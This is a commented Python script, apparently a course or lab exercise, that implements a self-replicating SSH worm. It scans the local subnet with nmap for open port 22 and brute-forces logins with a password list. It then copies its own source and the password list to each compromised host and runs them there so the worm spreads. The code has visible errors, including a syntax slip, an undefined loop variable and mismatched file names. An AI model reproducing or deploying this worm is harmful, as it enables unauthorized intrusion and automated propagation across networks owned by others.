#!usr/bin/env python3

# starting here first, we wrote the code diretly into the kali VM and already installed python3.  This made things easier than using VSC or PyCharm or even Repl.  We did perform some diagnostics and code-debuggin with VSC and Repl.

# in order to effectively use python, we needed to import modules.  The first module is nmap.  The nmap module enabled us to scan the subnet for IP addresses.  Nmap also enabled a scan for port 22.  Port 22 is commonly the SSH port.  Open port 22's potentially allow the client machine to connect with the victim machine, but it needs module paramiko in order to establish the connection.  The ifcfg module is useful for pulling information such as IP, netmask, hostnames and more.

import nmap
import ifcfg
import paramiko

# since we are using the command line to run a python script.  We need to instruct within the script to open this very script and read it.  Although seemingly redundant, it is a necessary part of opening, reading, and executing this file.
file = open("/home/kali/Documents/Python_Scripts/findopen22IP.py", mode = 'r')
# we read the file and place what is read into a new variable "all_of_it."
all_of_it = file.read()
# now that we have the variable, we can close the file.
file.close()
print(all_of_it) # here we use a print statement in order to assure ourselves that the file is running from the command line.

# next we create a function to loop through the interfaces and get the subnet without targeting the host machine.
def scripting_1():
    found_target_ips = []
    for name, interface in ifcfg.interfaces().items(): #using ifcfg to parse through interfaces.
        subnet = interface['inet'] + "/24"
        if subnet.startswith('127'): 
            continue:

        nm = nmap.PortScanner() # now that we have the subnet and the ips running on that subnet, we just want to isolate the ips with an open port 22/
        scan_ips = nm.scan(subnet, '22')
        for element in nm.all_hosts():
            if nm[element]['tcp'][22]['state'] == 'open':
                found_target_ips.append(element)
            else:
                continue
            if interface['inet'] in found_target_ips:  # But we need remove from the final list our host IP in order to not infect the host machine.
                found_target_ips.remove(interface['inet'])
    return found_target_ips
targets = scripting_1() # now we have the IP's of machines with open port 22's isolated into a list we can loop through.

# from here we establsih a connection and attempt to brute force log in to the victim machines using the paramiko module and ssh.
ssh = paramiko.SSHClient()

#paramike often throws a host_key_error from the verification of server hosts process.  However, Paramiko provides a way to raise/overcome this exception.
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#next, we will be bruteforceing login onto the victim machine. So, we need a list of passwords we can cycle through.  Plus, we need to sent this password list along to the victim machine in order for the worm to continue to replicate and pass from the victim machine on-to other machines.
file2 = open("/home/kali/Documents/Python_Scripts/passwordlist.txt", mode = 'r')
pass_list2 = file2.readlines()
for passwords in pass_list2: # since the password file is a list of characters, we need to make it a list of strings where we can loop through the indexed words.
    stripped_n = passwords.rstrip()
    print(stripped_n)
    joined_string = stripped_n.split(",")
    for element in joined_string:  # next, we need to loop through possible combinations of IPs from our IP list, usernames, and passwords from the password list.  For this we used the try method because we wanted to try the different items from the lists in combination with eachother.
        for hostname in c:
            try:
                ssh.connect(hostname=hostname, port=22, username='jacknostrand',password=element)
                # to help us review the script as it is working, we added a print statement here to show the "try" attempts and whether or not they are successful login credentials for a specific IP.
                print("Password found: " + element)
                stdin, stdout, stderr = ssh.exec_command(f"echo '{all_of_it}' > all3") # since we are self-replicating on the victim machine, we need to copy this pything code into a file on the victim machine.
                stdin, stdout, stderr = ssh.exec_command(f"echo '{pass_list2}' > password_list") # we also copy the password list.
                stdin, stdout, stderr = ssh.exec_command("python3 Ball3") #here we instruct the victim machine to run the script again, replicating the process cpmitnuously.
            except paramiko.ssh_exception.AuthenticationException:  # since most authentication attempts will result in an error, we want to accept the error and moveto the next "try" attempt.  So we created an exception that bypasses this error notification.
                print("invalid password " + element + "for hostname " + hostname)
                pass
